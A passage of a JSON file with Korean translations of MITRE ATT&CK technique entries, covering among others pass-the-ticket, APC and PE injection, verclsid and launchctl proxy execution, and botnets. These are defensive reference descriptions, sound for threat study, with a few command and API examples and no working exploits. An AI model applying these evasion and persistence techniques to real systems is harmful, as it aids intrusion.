    "description": "적대자는 도난당한 Kerberos 티켓을 사용하여 시스템 접근 제어를 우회하며 환경 내에서 수평 이동을 할 수 있습니다. '패스 더 티켓'(PtT) 방법은 계정 비밀번호에 접근하지 않고도 Kerberos 티켓을 사용하여 시스템에 인증하는 방법입니다. Kerberos 인증은 원격 시스템으로의 수평 이동을 위한 첫 단계로 사용될 수 있습니다.\n\nPtT를 수행할 때, 유효한 Kerberos 티켓은 시스템 자격 증명 덤프를 통해 캡처됩니다. 사용자의 서비스 티켓이나 티켓 부여 티켓(TGT)은 접근 수준에 따라 획득될 수 있습니다. 서비스 티켓은 특정 리소스에 접근할 수 있도록 하며, TGT는 사용자에게 권한이 있는 리소스에 접근하기 위해 티켓 부여 서비스(TGS)로부터 서비스 티켓을 요청하는 데 사용될 수 있습니다.\n\nSilver 티켓은 Kerberos를 인증 메커니즘으로 사용하는 서비스에 대해 획득할 수 있으며, 이러한 서비스는 특정 리소스에 접근하기 위한 티켓과 리소스를 호스팅하는 시스템에 접근하기 위해 티켓을 생성하는 데 사용됩니다.\n\nGolden 티켓은 도메인에 대해 키 배포 서비스 계정 KRBTGT의 NTLM 해시를 사용하여 획득할 수 있으며, 이는 Active Directory 내의 모든 계정에 대한 TGT 생성을 가능하게 합니다.\n\n적대자는 또한 도난당한 비밀번호 해시나 AES 키와 같은 다른 사용자 정보를 사용하여 유효한 Kerberos 티켓을 생성할 수 있습니다. 예를 들어, '해시 오버패스'는 NTLM 비밀번호 해시를 사용하여 사용자로 인증하고 동시에 비밀번호 해시를 사용하여 유효한 Kerberos 티켓을 생성하는 것입니다.",
    "external_id": "T1550.003",
    "modified": "2024-09-12T15:21:09.330Z",
    "translated": true
  },
  {
    "title": "Container Administration Command",
    "description": "적대자는 컨테이너 관리 서비스를 악용하여 컨테이너 내에서 명령을 실행할 수 있습니다. Docker 데몬, Kubernetes API 서버 또는 kubelet과 같은 컨테이너 관리 서비스는 환경 내의 컨테이너를 원격으로 관리할 수 있게 허용할 수 있습니다.\n\nDocker에서는 적대자가 컨테이너 배포 시 스크립트나 명령을 실행하는 엔트리포인트를 지정하거나, <code>docker exec</code>와 같은 명령을 사용하여 실행 중인 컨테이너 내에서 명령을 실행할 수 있습니다. Kubernetes에서는 적대자가 충분한 권한을 가지고 있을 경우, Kubernetes API 서버, kubelet과 상호작용하거나 <code>kubectl exec</code>와 같은 명령을 실행함으로써 클러스터 내의 컨테이너에서 원격 실행을 얻을 수 있습니다.",
    "external_id": "T1609",
    "modified": "2024-10-15T16:25:45.507Z",
    "translated": true
  },
  {
    "title": "File and Directory Discovery",
    "description": "적대자는 파일 시스템 내에서 특정 정보를 찾기 위해 호스트나 네트워크 공유의 특정 위치를 검색하거나 파일 및 디렉토리를 열거할 수 있습니다. 적대자는 자동화된 탐색 중 파일 및 디렉토리 발견의 정보를 사용하여 후속 행동을 결정할 수 있으며, 여기에는 적대자가 대상을 완전히 감염시킬지 여부와 특정 행동을 시도할지가 포함됩니다.\n\n많은 명령 셸 유틸리티를 사용하여 이 정보를 얻을 수 있습니다. 예를 들면, 디렉토리 나열, 트리 구조 보기, 파일 찾기 및 위치 찾기가 있습니다. 맞춤형 도구 또한 파일 및 디렉토리에 대한 정보를 수집하고 네이티브 API와 상호작용하는 데 사용될 수 있습니다. 적대자는 네트워크 장치에서 파일 및 디렉토리 정보를 수집하기 위해 네트워크 장치 CLI를 활용할 수도 있습니다.\n\n일부 파일 및 디렉토리는 접근하기 위해 권한 상승 또는 특정 사용자 권한이 필요할 수 있습니다.",
    "external_id": "T1083",
    "modified": "2024-04-16T12:40:10.978Z",
    "translated": true
  },
  {
    "title": "Dynamic Resolution",
    "description": "적대 세력은 일반적인 탐지 및 대응을 피하기 위해 명령 및 제어 인프라에 동적으로 연결을 설정할 수 있습니다. 이는 적대 세력이 맬웨어의 통신을 수신하는 데 사용하는 인프라와 동일한 알고리즘을 공유하는 맬웨어를 사용하여 달성될 수 있습니다. 이러한 계산은 맬웨어가 명령 및 제어를 위해 사용하는 도메인 이름, IP 주소 또는 포트 번호와 같은 매개변수를 동적으로 조정하는 데 사용될 수 있습니다.\n\n적대 세력은 백업 채널의 목적을 위해 동적 해상도를 사용할 수 있습니다. 주 명령 및 제어 서버와의 연락이 끊겼을 때 맬웨어는 동적 해상도를 사용하여 명령 및 제어를 재설정하는 수단으로 활용할 수 있습니다.",
    "external_id": "T1568",
    "modified": "2022-03-11T18:26:23.782Z",
    "translated": true
  },
  {
    "title": "Masquerade Task or Service",
    "description": "적대자는 작업이나 서비스의 이름을 조작하여 합법적이거나 해가 없는 것처럼 보이게 하려 할 수 있습니다. 작업 스케줄러나 systemd에 의해 실행되는 작업/서비스는 일반적으로 이름 및/또는 설명이 부여됩니다. Windows 서비스는 서비스 이름과 디스플레이 이름을 가집니다. 일반적으로 연관된 이름을 가진 많은 합법적인 작업과 서비스가 존재합니다. 적대자는 합법적인 작업이나 서비스와 유사하거나 동일한 이름을 부여할 수 있습니다.\n\n작업이나 서비스는 설명과 같은 다른 필드를 포함하고 있으며, 적대자는 이를 합법적으로 보이게 하려 할 수 있습니다.",
    "external_id": "T1036.004",
    "modified": "2023-09-29T20:30:58.300Z",
    "translated": true
  },
  {
    "title": "Asynchronous Procedure Call",
    "description": "적대자는 비동기 프로시저 호출(APC) 큐를 통해 프로세스에 악성 코드를 주입하여 프로세스 기반 방어를 회피하고 권한 상승을 시도할 수 있습니다. APC 주입은 별도의 활성 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다.\n\nAPC 주입은 일반적으로 프로세스의 스레드에 있는 APC 큐에 악성 코드를 첨부하여 수행됩니다. 큐에 들어 있는 APC 함수는 스레드가 변경 가능한 상태에 들어갈 때 실행됩니다. 먼저 <code>OpenThread</code>와 같은 기본 Windows API 호출을 사용하여 기존의 피해자 프로세스에 대한 핸들이 생성됩니다. 이 시점에서 <code>QueueUserAPC</code>를 사용하여 악성 DLL을 가리키는 <code>LoadLibraryA</code>와 같은 함수를 호출할 수 있습니다.\n\n\"얼리 버드 주입\"이라는 APC 주입의 변형은 악성 코드를 작성하고 실행할 수 있는 중단된 프로세스를 생성하는 것으로, 이 과정에서 프로세스의 진입 지점(및 이후의 안티 맬웨어 후크)을 통해 APC를 사용합니다. AtomBombing은 APC를 활용하여 이전에 글로벌 원자 테이블에 작성된 악성 코드를 호출하는 또 다른 변형입니다.\n\n다른 프로세스의 컨텍스트에서 코드를 실행하는 것은 프로세스의 메모리, 시스템/네트워크 자원에 접근할 수 있게 하며, 권한 상승이 이루어질 수 있습니다. APC 주입을 통한 실행은 합법적인 프로세스 아래에서 숨겨져 있기 때문에 보안 제품의 탐지를 회피할 수 있습니다.",
    "external_id": "T1055.004",
    "modified": "2021-10-18T12:23:46.476Z",
    "translated": true
  },
  {
    "title": "Traffic Duplication",
    "description": "적대자는 침해된 인프라를 통해 데이터 유출을 자동화하기 위해 트래픽 미러링을 활용할 수 있습니다. 트래픽 미러링은 일부 장치의 기본 기능으로, 네트워크 분석에 자주 사용됩니다. 장치는 네트워크 분석기나 기타 모니터링 장치를 위해 네트워크 트래픽을 하나 이상의 대상으로 전달하도록 구성될 수 있습니다.\n\n적대자는 트래픽 미러링을 악용하여 자신이 제어하는 다른 인프라를 통해 네트워크 트래픽을 미러링하거나 리디렉션할 수 있습니다. 트래픽 리디렉션을 가능하게 하기 위해 네트워크 장치에 악의적인 수정을 가하는 것이 가능할 수 있습니다.\n\n많은 클라우드 기반 환경도 트래픽 미러링을 지원합니다. 예를 들어, AWS 트래픽 미러링, GCP 패킷 미러링 및 Azure vTap은 사용자가 트래픽을 수집할 특정 인스턴스와 수집된 트래픽을 보낼 특정 대상을 정의할 수 있도록 합니다.\n\n적대자는 트래픽 중복을 [네트워크 스니핑], [입력 캡처] 또는 [중간자 공격]과 결합하여 사용할 수 있으며, 이는 적대자의 목표와 목적에 따라 달라집니다.",
    "external_id": "T1020.001",
    "modified": "2024-10-15T16:08:13.273Z",
    "translated": true
  },
  {
    "title": "Plist File Modification",
    "description": "적대자는 속성 목록 파일(플리스트 파일)을 수정하여 다른 악의적인 활동을 가능하게 하고, 시스템 방어를 우회할 수 있습니다. macOS 애플리케이션은 `info.plist` 파일과 같은 plist 파일을 사용하여 속성과 구성 설정을 저장하며, 이는 운영 체제에 해당 애플리케이션을 실행할 때 어떻게 처리해야 하는지를 알려줍니다. Plist 파일은 키-값 쌍으로 구성된 메타데이터로, 애플의 Core Foundation DTD를 기반으로 XML 형식으로 작성됩니다. Plist 파일은 텍스트 또는 이진 형식으로 저장할 수 있습니다.\n\n적대자는 plist 파일의 키-값 쌍을 수정하여 시스템 동작에 영향을 줄 수 있으며, 예를 들어 애플리케이션의 실행을 숨기거나 추가 명령을 실행하여 지속성을 유지할 수 있습니다.\n\n예를 들어, 적대자는 `~/Library/Preferences/com.apple.dock.plist` 파일에 악성 애플리케이션 경로를 추가하여 Dock에 표시되는 앱을 제어할 수 있습니다. 또한, 적대자는 애플리케이션의 `info.plist` 파일에서 `LSUIElement` 키를 수정하여 애플리케이션을 백그라운드에서 실행할 수 있습니다. 적대자는 또한 환경 변수를 추가하기 위해 키-값 쌍을 삽입할 수 있으며, 이는 지속성을 위해 동적 링커 하이재킹을 활성화하는 데 사용될 수 있습니다.",
    "external_id": "T1647",
    "modified": "2022-04-20T22:00:33.375Z",
    "translated": true
  },
  {
    "title": "AppCert DLLs",
    "description": "적대자는 AppCert DLL이 프로세스에 로드될 때 트리거되는 악성 콘텐츠를 실행함으로써 지속성을 설정하거나 권한을 상승시킬 수 있습니다. <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> 아래의 <code>AppCertDLLs</code> 레지스트리 키에 지정된 동적 연결 라이브러리(DLL)는 <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, 또는 <code>WinExec</code>와 같은 널리 사용되는 응용 프로그래밍 인터페이스(API) 기능을 호출하는 모든 프로세스에 로드됩니다.\n\n[프로세스 주입]과 유사하게, 이 값은 악성 DLL이 컴퓨터의 별도 프로세스에서 로드되고 실행되도록 하여 권한을 상승시키는 데 악용될 수 있습니다. 악성 AppCert DLL은 API 활동에 의해 지속적으로 트리거됨으로써 지속성을 제공할 수도 있습니다.",
    "external_id": "T1546.009",
    "modified": "2020-11-10T18:29:31.052Z",
    "translated": true
  },
  {
    "title": "Email Forwarding Rule",
    "description": "적대자들은 민감한 정보를 수집하기 위해 이메일 전달 규칙을 설정할 수 있습니다. 이들은 이메일 전달 규칙을 남용하여 피해자의 활동을 모니터링하고 정보를 훔치며, 추가적인 착취나 작전의 일환으로 피해자 또는 피해자의 조직에 대한 정보를 수집할 수 있습니다. 또한 이메일 전달 규칙을 통해 적대자들은 관리자에 의해 계정 정보가 재설정된 이후에도 피해자의 이메일에 지속적으로 접근할 수 있게 됩니다. 대부분의 이메일 클라이언트는 사용자가 다른 수신자에게 전달하는 등 다양한 이메일 기능을 위한 인박스 규칙을 생성할 수 있도록 허용합니다. 이러한 규칙은 로컬 이메일 애플리케이션, 웹 인터페이스 또는 명령줄 인터페이스를 통해 생성될 수 있습니다. 메시지는 내부 또는 외부 수신자로 전달될 수 있으며, 이 규칙의 범위를 제한하는 제약은 없습니다. 관리자들도 동일한 고려 사항과 결과를 가지고 사용자 계정을 위한 전달 규칙을 생성할 수 있습니다.\n\n조직 내의 어떤 사용자나 관리자(또는 유효한 자격 증명을 가진 적대자)도 수신된 모든 메시지를 자동으로 다른 수신자에게 전달하거나, 발신자에 따라 이메일을 다른 위치로 전달하는 등의 규칙을 만들 수 있습니다. 적대자들은 또한 Microsoft Messaging API(MAPI)를 사용하여 규칙의 속성을 수정함으로써 규칙을 숨기고 Outlook, OWA 또는 대부분의 Exchange 관리 도구에서 보이지 않게 만들 수도 있습니다.\n\n일부 환경에서는 관리자가 개별 인박스가 아니라 조직 전체에서 작동하는 이메일 전달 규칙을 활성화할 수 있습니다. 예를 들어, Microsoft Exchange는 조직이 수신하는 모든 이메일에 대해 사용자 지정 조건을 평가한 후, 이러한 조건을 준수하는 이메일에 대해 사용자 지정된 작업을 수행하는 전송 규칙을 지원합니다. 이러한 기능을 남용하는 적대자는 조직이 수신하는 모든 이메일 또는 특정 이메일에 대한 전달을 활성화할 수 있을지도 모릅니다.",
    "external_id": "T1114.003",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Data Staged",
    "description": "적대자는 데이터를 유출하기 전에 중앙 위치나 디렉토리에 수집된 데이터를 준비할 수 있습니다. 데이터는 별도의 파일로 보관되거나 하나의 파일로 결합될 수 있습니다. 상호작용하는 명령 셸을 사용하고, 일반적인 기능을 사용하여 데이터를 준비 위치로 복사할 수 있습니다.\n\n클라우드 환경에서는 적대자가 데이터 유출 전에 특정 인스턴스나 가상 머신 내에서 데이터를 준비할 수 있습니다. 적대자는 클라우드 인스턴스를 생성하고 그 인스턴스 내에서 데이터를 준비할 수 있습니다.\n\n적대자는 피해자의 네트워크에서 중앙 집중식 위치에 데이터를 준비한 후 데이터 유출을 선택할 수 있으며, 이는 C2 서버와의 연결 수를 최소화하고 탐지를 회피하는 데 도움이 됩니다.",
    "external_id": "T1074",
    "modified": "2024-09-30T13:28:37.415Z",
    "translated": true
  },
  {
    "title": "Steal or Forge Authentication Certificates",
    "description": "적대자는 원격 시스템이나 자원에 접근하기 위해 인증에 사용되는 인증서를 도난당하거나 위조할 수 있습니다. 디지털 인증서는 메시지 및/또는 파일을 서명하고 암호화하는 데 자주 사용됩니다. 인증서는 또한 인증 자료로 사용됩니다. 예를 들어, Entra ID 장치 인증서와 Active Directory 인증 서비스(AD CS) 인증서는 신원에 바인딩되어 도메인 계정의 자격 증명으로 사용될 수 있습니다.\n\n인증 인증서는 도난당하거나 위조될 수 있습니다. 예를 들어, AD CS 인증서는 암호화된 저장소(레지스트리 또는 파일)에서 도난당하거나, 잘못된 위치에 저장된 인증서 파일 또는 다양한 암호화 API를 통해 Windows 인증서 저장소에서 직접 도난당할 수 있습니다. 적절한 등록 권한이 있으면 도메인 내의 사용자 및/또는 기계가 기업 인증 기관(CA)으로부터 인증서를 요청하거나 수동으로 갱신할 수 있습니다. 이 등록 과정은 인증서와 관련된 다양한 설정 및 권한을 정의합니다. 특히, 인증서의 확장 키 사용(EKU) 값은 서명, 암호화 및 인증 사용 사례를 정의하며, 인증서의 주체 대체 이름(SAN) 값은 인증서 소유자의 대체 이름을 정의합니다.\n\n인증 자격 증명으로 인증서를 남용하는 것은 다른 행동, 예를 들어 측면 이동을 가능하게 할 수 있습니다. 인증서 관련 잘못 구성은 사용자가 인증서와 관련된 신원을 통해 특권 계정이나 권한을 가장하거나 가정하도록 허용하여 권한 상승의 기회를 제공할 수 있습니다. 이러한 남용은 또한 인증서의 유효 기간 동안 사용자 비밀번호 재설정에도 불구하고 유효한 계정으로 사용될 수 있는 인증서를 도난당하거나 위조함으로써 지속성을 가능하게 할 수 있습니다. 인증 인증서는 기계 계정에 대해서도 도난당하거나 위조될 수 있습니다.\n\n루트(또는 하위) CA 인증서 개인 키(또는 이러한 키를 보호하거나 관리하는 메커니즘)에 접근할 수 있는 적대자는 피해자의 도메인에 대해 임의의 인증서를 위조하여 지속성을 확립할 수 있습니다(이것을 \"골든\" 인증서라고 함). 적대자는 또한 다른 형태의 자격 증명에 접근하기 위해 인증서 및 관련 서비스를 타겟으로 할 수 있습니다.",
    "external_id": "T1649",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Device Registration",
    "description": "적대자는 적대자가 제어하는 계정에 장치를 등록할 수 있습니다. 장치는 네트워크에 대한 인증을 처리하는 다단계 인증(MFA) 시스템이나 장치 접근 및 준수를 관리하는 장치 관리 시스템에 등록될 수 있습니다.\n\nMFA 시스템은 사용자가 MFA 요구 사항을 충족하기 위해 계정과 장치를 연결할 수 있도록 허용합니다. 사용자의 자격 증명을 탈취한 적대자는 초기 MFA 요구 사항을 우회하고 네트워크에 지속적으로 접근하기 위해 새로운 장치를 등록할 수 있습니다. 어떤 경우에는 MFA 자가 등록 과정에서 계정의 첫 번째 장치를 등록하거나 비활성 계정에 장치를 등록하기 위해 사용자 이름과 비밀번호만 필요할 수 있습니다.\n\n유사하게, 네트워크에 이미 접근할 수 있는 적대자는 Entra ID 및/또는 장치 관리 시스템인 Microsoft Intune에 장치를 등록하여 조건부 접근 정책을 우회하면서 민감한 데이터나 자원에 접근할 수 있습니다.\n\nEntra ID에 등록된 장치는 내부 조직 이메일을 통한 내부 스피어피싱 캠페인을 수행할 수 있으며, 이는 이메일 클라이언트에서 의심스럽게 간주될 가능성이 낮습니다. 또한, 적대자는 대량의 장치를 등록하여 Entra ID 테넌트에 대해 서비스 소진 홍수를 실행할 수 있습니다.",
    "external_id": "T1098.005",
    "modified": "2024-09-25T20:39:53.597Z",
    "translated": true
  },
  {
    "title": "System Network Connections Discovery",
    "description": "적대자는 현재 액세스하고 있는 시스템이나 원격 시스템에서 네트워크 연결 목록을 가져오려고 시도할 수 있습니다. \n\n클라우드 기반 환경의 일부인 시스템에 접근한 적대자는 Virtual Private Cloud(VPC) 또는 가상 네트워크를 매핑하여 어떤 시스템과 서비스가 연결되어 있는지 파악할 수 있습니다. 수행되는 행동은 운영 체제에 따라 유사한 종류의 탐색 기술일 가능성이 높지만, 결과적인 정보에는 적대자의 목표와 관련된 네트워크 기반 클라우드 환경에 대한 세부사항이 포함될 수 있습니다. 클라우드 제공업체마다 그들의 가상 네트워크 운영 방식이 다를 수 있습니다. 유사하게, 네트워크 장치에 접근한 적대자도 연결된 시스템 및 서비스에 대한 정보를 수집하기 위해 유사한 탐색 활동을 수행할 수 있습니다.\n\n이 정보를 획득하는 유틸리티와 명령에는 \"netstat\", \"net use\", \"net session\"과 같은 명령이 포함됩니다. Mac 및 Linux에서는 \"netstat\"와 \"lsof\"를 사용하여 현재 연결을 나열할 수 있습니다. \"who -a\" 및 \"w\"는 현재 로그인한 사용자를 표시하는 데 사용할 수 있습니다. 또한, 네트워크 장치에 기본적으로 내장된 기능 및 CLI를 사용하여 정보에 접근할 수 있습니다.",
    "external_id": "T1049",
    "modified": "2022-09-06T22:35:34.231Z",
    "translated": true
  },
  {
    "title": "Compromise Infrastructure",
    "description": "적대 세력은 목표 설정 중에 사용할 수 있는 제3자 인프라를 손상시킬 수 있습니다. 인프라 솔루션에는 물리적 또는 클라우드 서버, 도메인, 네트워크 장치, 제3자 웹 및 DNS 서비스가 포함됩니다. 적대 세력이 인프라를 구매, 임대 또는 빌리는 대신, 인프라를 손상시키고 적대 세력 생애주기의 다른 단계에서 이를 사용할 수 있습니다. 또한, 적대 세력은 여러 대의 머신을 손상시켜 봇넷을 구성하여 이를 활용할 수 있습니다.\n\n손상된 인프라의 사용은 적대 세력이 작전을 준비하고 시작하며 실행하는 데 도움을 줍니다. 손상된 인프라는 적대 세력의 작전이 정상으로 간주되는 트래픽과 혼합되도록 도와줄 수 있으며, 이는 신뢰할 수 있는 사이트 또는 고평가된 사이트와의 접촉을 포함할 수 있습니다. 예를 들어, 적대 세력은 손상된 인프라를 활용하여 정보 수집을 지원하고 피싱 캠페인을 지원할 수 있습니다. 또한 적대 세력은 프록시 및 프록시웨어 서비스를 지원하기 위해 인프라를 손상시킬 수 있습니다.\n\n손상된 인프라를 사용함으로써, 적대 세력은 그들의 행동을 자신에게 연결하기 어렵게 만들 수 있습니다. 목표 설정 이전에 적대 세력은 다른 적대 세력의 인프라를 손상시킬 수 있습니다.",
    "external_id": "T1584",
    "modified": "2024-10-16T20:06:03.570Z",
    "translated": true
  },
  {
    "title": "Mark-of-the-Web Bypass",
    "description": "적대자는 특정 파일 형식을 악용하여 웹 마크(MOTW) 제어를 무력화할 수 있습니다. Windows에서 파일이 인터넷에서 다운로드되면, 해당 파일은 MOTW로 알려진 특정 값과 함께 <code>Zone.Identifier</code>라는 이름의 숨겨진 NTFS 대체 데이터 스트림(ADS)으로 태그됩니다. MOTW로 태그된 파일은 보호되며 특정 작업을 수행할 수 없습니다. 예를 들어, MS Office 10부터 MOTW가 있는 MS Office 파일은 보호 모드에서 열립니다. MOTW로 태그된 실행 파일은 Windows Defender SmartScreen에 의해 처리되며, 이 SmartScreen은 파일을 잘 알려진 실행 파일의 허용 목록과 비교합니다. 파일이 알려지지 않았거나 신뢰할 수 없는 경우, SmartScreen은 실행을 차단하고 사용자에게 실행하지 않도록 경고합니다.\n\n적대자는 압축/아카이브(.arj, .gzip) 또는 디스크 이미지(.iso, .vhd)와 같은 컨테이너 파일 형식을 악용하여 MOTW가 태그되지 않은 악성 페이로드를 전달할 수 있습니다. 인터넷에서 다운로드된 컨테이너 파일은 MOTW로 표시되지만, 컨테이너 파일이 추출되거나 탑재된 후 내에 포함된 파일은 MOTW를 상속받지 않을 수 있습니다. MOTW는 NTFS 기능이며, 많은 컨테이너 파일은 NTFS 대체 데이터 스트림을 지원하지 않습니다. 컨테이너 파일이 추출되거나 탑재된 후, 그 안에 포함된 파일은 디스크의 로컬 파일로 취급되어 보호 없이 실행될 수 있습니다.",
    "external_id": "T1553.005",
    "modified": "2023-03-22T14:19:50.768Z",
    "translated": true
  },
  {
    "title": "Disable Crypto Hardware",
    "description": "적대자는 네트워크 장치의 전용 하드웨어 암호화를 비활성화하여, 소프트웨어 암호화의 약점을 악용하여 전송된 데이터를 수집, 조작 및 유출하는 데 드는 노력을 줄일 수 있습니다.\n\n라우터, 스위치 및 방화벽과 같은 많은 네트워크 장치는 네트워크를 통한 전송을 보호하기 위해 네트워크 트래픽의 암호화를 수행합니다. 종종 이러한 장치는 암호화 프로세스의 속도를 크게 증가시키고 악의적인 변조를 방지하기 위해 특별한 전용 암호화 하드웨어를 갖추고 있습니다. 적대자가 이러한 장치를 제어하게 되면, 예를 들어 시스템 이미지를 수정하는 방법을 통해 전용 하드웨어를 비활성화하고 일반 프로세서에서 소프트웨어로 암호화를 수행하도록 강제할 수 있습니다. 이는 일반적으로 소프트웨어에서 암호의 강도를 약화시키기 위한 공격과 함께 사용됩니다.",
    "external_id": "T1600.002",
    "modified": "2020-10-21T22:37:48.503Z",
    "translated": true
  },
  {
    "title": "Pre-OS Boot",
    "description": "적대자들은 시스템에서 지속성을 유지하기 위해 Pre-OS 부팅 메커니즘을 악용할 수 있습니다. 컴퓨터의 부팅 과정에서 운영 체제 이전에 펌웨어와 다양한 시작 서비스가 로드됩니다. 이러한 프로그램은 운영 체제가 제어를 시작하기 전에 실행 흐름을 제어합니다.\n\n적대자들은 BIOS(기본 입출력 시스템) 및 통합 확장 펌웨어 인터페이스(UEFI)와 같은 부트 드라이버나 펌웨어의 데이터를 덮어써서 운영 체제 아래의 레이어에서 시스템에 지속성을 유지할 수 있습니다. 이 수준의 맬웨어는 호스트 소프트웨어 기반 방어 시스템에 의해 탐지되지 않으므로 특히 탐지하기 어려울 수 있습니다.",
    "external_id": "T1542",
    "modified": "2024-02-26T14:26:14.364Z",
    "translated": true
  },
  {
    "title": "Build Image on Host",
    "description": "적대자는 방어 시스템이 공용 레지스트리에서 악성 이미지를 검색하는 것을 모니터링하는 것을 우회하기 위해 호스트에서 직접 컨테이너 이미지를 구축할 수 있습니다. 원격 <code>build</code> 요청이 Docker API에 보내져, 공용 또는 로컬 레지스트리에서 기본 이미지(예: alpine)를 가져오고 그 위에 사용자 정의 이미지를 구축하는 Dockerfile이 포함될 수 있습니다.\n\n적대자는 해당 <code>build</code> API를 이용해 호스트에서 C2 서버에서 다운로드한 악성 프로그램이 포함된 사용자 정의 이미지를 구축할 수 있으며, 이후 그 사용자 정의 이미지를 사용하여 컨테이너를 배포할 수 있습니다. 기본 이미지가 공용 레지스트리에서 가져온 경우 방어 시스템은 해당 이미지를 악성으로 탐지하지 못할 가능성이 높습니다. 기본 이미지가 이미 로컬 레지스트리에 존재하는 경우, 이미지는 환경 내에 있기 때문에 훨씬 덜 의심스럽게 여겨질 수 있습니다.",
    "external_id": "T1612",
    "modified": "2023-04-15T16:22:09.807Z",
    "translated": true
  },
  {
    "title": "Portable Executable Injection",
    "description": "적대자는 프로세스 기반 방어를 회피하고 권한을 상승시키기 위해 포터블 실행 파일(PE)을 프로세스에 주입할 수 있습니다. PE 주입은 별도의 실행 중인 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다.\n\nPE 주입은 일반적으로 코드(디스크에 파일 없이)를 대상 프로세스의 가상 주소 공간에 복사한 후 새 스레드를 통해 호출하는 방식으로 수행됩니다. 이 쓰기는 네이티브 Windows API 호출을 사용하여 수행할 수 있으며, 그 후 <code>CreateRemoteThread</code> 또는 추가 코드를 통해 실행됩니다. 주입된 코드의 변위는 메모리 참조를 다시 매핑하기 위한 기능의 추가 요구 사항을 도입합니다.\n\n다른 프로세스의 컨텍스트에서 코드를 실행하는 것은 프로세스의 메모리, 시스템/네트워크 리소스에 대한 접근을 가능하게 하고, 권한 상승이 이루어질 수도 있습니다. PE 주입을 통한 실행은 정당한 프로세스 아래에서 마스킹되어 보안 제품의 감지를 회피할 수도 있습니다.",
    "external_id": "T1055.002",
    "modified": "2021-10-18T12:21:11.178Z",
    "translated": true
  },
  {
    "title": "Verclsid",
    "description": "적대자는 verclsid.exe를 악성 코드를 프록시 실행하는 데 악용할 수 있습니다. verclsid.exe는 확장 CLSID 검증 호스트로 알려져 있으며, Windows 탐색기나 Windows 셸에서 사용되기 전에 각 셸 확장을 검증하는 역할을 합니다.\n\n적대자는 verclsid.exe를 이용해 악성 페이로드를 실행할 수 있습니다. 이는 <code>verclsid.exe /S /C {CLSID}</code>를 실행함으로써 달성될 수 있으며, 여기서 파일은 COM 객체를 식별하는 데 사용되는 고유 식별 번호인 클래스 ID (CLSID)로 참조됩니다. verclsid.exe가 실행하는 COM 페이로드는 원격 서버에서 COM 스크립틀릿(SCT)을 로드하고 실행하는 등 다양한 악성 행동을 수행할 수 있습니다. 이 이진 파일은 서명되거나 Windows 시스템에서 네이티브일 수 있으므로, verclsid.exe를 통한 실행 프록시는 이의 잠재적 악용을 고려하지 않는 애플리케이션 제어 솔루션을 우회할 수 있습니다.",
    "external_id": "T1218.012",
    "modified": "2022-05-20T17:35:28.221Z",
    "translated": true
  },
  {
    "title": "Compromise Accounts",
    "description": "적대 세력은 타겟팅 동안 사용할 수 있는 서비스의 계정을 손상시킬 수 있습니다. 사회 공학을 포함하는 작전에서는 온라인 페르소나의 활용이 중요할 수 있습니다. 계정을 새로 만들고 키우는 대신, 적대 세력은 기존 계정을 손상시킬 수 있습니다. 기존 페르소나를 활용하면, 피해자가 손상된 페르소나와 관계가 있거나 그에 대한 정보를 알고 있을 경우, 신뢰도를 높일 수 있습니다.\n\n계정을 손상시키기 위한 다양한 방법이 존재하며, 여기에는 정보를 파밍하여 자격 증명을 모으거나, 제3자 사이트에서 자격 증명을 구매하거나, 자격 증명에 대한 강제 공격(예: 유출된 자격 증명을 재사용하는 경우), 혹은 직원, 공급업체 또는 비즈니스 파트너에게 자격 증명에 대한 접근을 지불하는 방법 등이 있습니다. 계정을 손상시키기 전에, 적대 세력은 어떤 계정을 손상시켜 작전을 진행할지에 대한 결정을 위해 정찰 작업을 수행할 수 있습니다.\n\n페르소나는 단일 사이트나 여러 사이트(Facebook, LinkedIn, Twitter, Google 등)에서 존재할 수 있습니다. 손상된 계정은 추가적인 개발이 필요할 수 있으며, 여기에는 프로필 정보를 작성하거나 수정하거나, 소셜 네트워크를 더 발전시키거나, 사진을 포함하는 것이 포함될 수 있습니다.\n\n적대 세력은 손상된 이메일 계정을 직접 활용하여 정보를 파밍하거나 피싱에 활용할 수 있습니다.",
    "external_id": "T1586",
    "modified": "2023-04-11T01:08:56.774Z",
    "translated": true
  },
  {
    "title": "Launchctl",
    "description": "적대 세력은 launchctl을 악용하여 명령이나 프로그램을 실행할 수 있습니다. Launchctl은 macOS의 서비스 관리 프레임워크인 launchd와 인터페이스합니다. Launchctl은 명령줄, 대화형, 또는 표준 입력에서 리다이렉트된 서브 명령을 지원합니다. \n\n적대 세력은 launchctl을 사용하여 [Launch Agent] 또는 [Launch Daemon]으로 명령 및 프로그램을 실행합니다. 일반적인 서브 명령으로는 launchctl load, launchctl unload, launchctl start가 포함됩니다. 적대 세력은 스크립트를 사용하거나 수동으로 명령 launchctl load -w \"%s/Library/LaunchAgents/%s\" 또는 /bin/launchctl load를 실행하여 [Launch Agent] 또는 [Launch Daemon]을 실행할 수 있습니다.",
    "external_id": "T1569.001",
    "modified": "2024-09-20T20:14:35.179Z",
    "translated": true
  },
  {
    "title": "Botnet",
    "description": "적대적 행위자들은 타겟팅 중에 사용할 수 있는 봇넷을 형성하기 위해 여러 제3자 시스템을 손상할 수 있습니다. 봇넷은 조정된 작업을 수행하도록 지시할 수 있는 손상된 시스템의 네트워크입니다. 적대적 행위자들은 부팅 서비스나 스트레서 서비스에서 봇넷을 구매하거나 임대하는 대신, 여러 제3자 시스템을 손상시켜 자신의 봇넷을 구축할 수 있습니다. 또한, 기존 봇넷을 인수하여 봇을 적대적 행위자가 제어하는 C2 서버로 리디렉션하는 등의 활동을 할 수 있습니다. 봇넷을 이용하여 적대적 행위자들은 대규모 피싱이나 분산 서비스 거부(DDoS) 공격과 같은 후속 활동을 수행할 수 있습니다.",
    "external_id": "T1584.005",
    "modified": "2022-04-19T15:55:58.319Z",
    "translated": true
  },
  {
    "title": "Network Device CLI",
